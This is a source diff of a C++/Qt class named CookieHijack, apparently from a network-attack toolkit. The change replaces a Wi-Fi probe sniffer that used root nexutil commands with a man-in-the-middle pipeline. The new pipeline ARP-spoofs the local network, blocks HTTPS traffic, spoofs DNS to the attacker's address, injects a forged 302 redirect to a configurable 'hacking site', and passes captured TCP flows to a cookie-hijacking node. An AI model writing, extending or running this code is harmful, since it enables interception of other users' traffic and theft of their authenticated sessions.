@@ -1,14 +1,37 @@
 #include "cookiehijack.h"
 
-CookieHijack::CookieHijack(QObject* parent) : GStateObj(parent) {
-#ifdef Q_OS_ANDROID
-	command_.openCommands_.push_back(new GCommandItem(this, QStringList{"su -c \"nexutil -c1\"", "su -c \"nexutil -d\"", "su -c \"nexutil -m2\""}));
-	command_.closeCommands_.push_back(new GCommandItem(this, QStringList{"su -c \"nexutil -m0\"", "su -c \"ifconfig wlan0 down\""}));
-#endif
+CookieHijack::CookieHijack(QObject* parent) : GGraph(parent) {
+	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &dnsBlock_, &GDnsBlock::block, Qt::DirectConnection);
 
-	// for probeDetected signal
-	qRegisterMetaType<GMac>("GMac");
-	QObject::connect(&monitorDevice_, &GMonitorDevice::captured, this, &CookieHijack::processCaptured, Qt::DirectConnection);
+	// 40 : minimum value of ip header size + tcp header size
+	find_.findItems_.push_back(new GFindItem(this, 40, -1, 1, "GET /generate_204 HTTP/1."));
+
+	tcpBlock_.backwardBlockType_ = GTcpBlock::Fin;
+	// tcpBlock_.backwardFinMsg_ // set in doOpen
+
+	cookieHijack_.tcpFlowMgr_ = &tcpFlowMgr_;
+
+	bpFilter_.filter_ = "tcp port 443";
+
+	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &find_, &GFind::find, Qt::DirectConnection);
+	QObject::connect(&find_, &GFind::found, &tcpBlock_, &GTcpBlock::block, Qt::DirectConnection);
+
+	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &dnsBlock_, &GDnsBlock::block, Qt::DirectConnection);
+
+	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &tcpFlowMgr_, &GTcpFlowMgr::manage, Qt::DirectConnection);
+	QObject::connect(&tcpFlowMgr_, &GTcpFlowMgr::managed, &cookieHijack_, &GCookieHijack::hijack, Qt::DirectConnection);
+
+	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &bpFilter_, &GBpFilter::filter, Qt::DirectConnection);
+	QObject::connect(&bpFilter_, &GBpFilter::filtered, &block_, &GBlock::block, Qt::DirectConnection);
+
+	nodes_.append(&autoArpSpoof_);
+	nodes_.append(&find_);
+	nodes_.append(&tcpBlock_);
+	nodes_.append(&dnsBlock_);
+	nodes_.append(&tcpFlowMgr_);
+	nodes_.append(&cookieHijack_);
+	nodes_.append(&bpFilter_);
+	nodes_.append(&block_);
 }
 
 CookieHijack::~CookieHijack() {
@@ -16,51 +39,36 @@ CookieHijack::~CookieHijack() {
 }
 
 bool CookieHijack::doOpen() {
-	if (!monitorDevice_.open()) {
-		err = monitorDevice_.err;
-		return false;
-	}
+	QString intfName = autoArpSpoof_.intfName_;
+	tcpBlock_.writer_.intfName_ = intfName;
+	dnsBlock_.writer_.intfName_ = intfName;
+
+	bool res = GGraph::doOpen();
+	if (!res) return false;
+
+	QStringList http;
+	http += "HTTP/1.1 302 Redirect";
+	http += QString("Location: http://%1.%2").arg(prefix_).arg(hackingSite_);
+	http += "";
+	http += "";
+	tcpBlock_.backwardFinMsg_ = http;
+
+	dnsBlock_.dnsBlockItems_.clear();
+	dnsBlock_.dnsBlockItems_.push_back(new GDnsBlockItem(this, prefix_ + ".*", QString(autoArpSpoof_.intf()->ip())));
 
 	return true;
 }
 
 bool CookieHijack::doClose() {
-	monitorDevice_.close();
-	return true;
+	bool res = GGraph::doClose();
+
+	return res;
 }
 
-void CookieHijack::processCaptured(GPacket* packet) {
-	GDot11Hdr* dot11Hdr = packet->dot11Hdr_;
-	if (dot11Hdr == nullptr) return;
-
-	QString type = "";
-	le8_t typeSubtype = dot11Hdr->typeSubtype();
-	switch (typeSubtype) {
-		case GDot11::ProbeRequest: type = "PR"; break;
-		case GDot11::Authentication: type = "AT"; break;
-		case GDot11::AssociationRequest: type = "AS"; break;
-		case GDot11::ReassociationRequest: type = "RA"; break;
-		case GDot11::Deauthentication: type = "DT"; break;
-		case GDot11::Disassociation: type = "DA"; break;
-	}
-	if (type == "") return;
-
-	int channel = 0;
-	QList<GBuf> frequencyList = packet->radioHdr_->getPresentFlags(GRadioHdr::Channel);
-	if (frequencyList.size() > 0) {
-		le16_t frequency = *reinterpret_cast<le16_t*>(frequencyList.at(0).data_);
-		channel = GRadioHdr::freqToChannel(frequency);
-	}
-
-	GRadioHdr* radioHdr = packet->radioHdr_;
-	if (radioHdr == nullptr) return;
-
-	int8_t signal = radioHdr->getSignal();
-	if (signal == 0) return;
-	if (signal < minSignal_) return;
-
-	GMac mac = dot11Hdr->ta();
-
-	emit probeDetected(mac, type, channel, signal);
+void CookieHijack::propLoad(QJsonObject jo) {
+	GProp::propLoad(jo);
 }
 
+void CookieHijack::propSave(QJsonObject& jo) {
+	GProp::propSave(jo);
+}
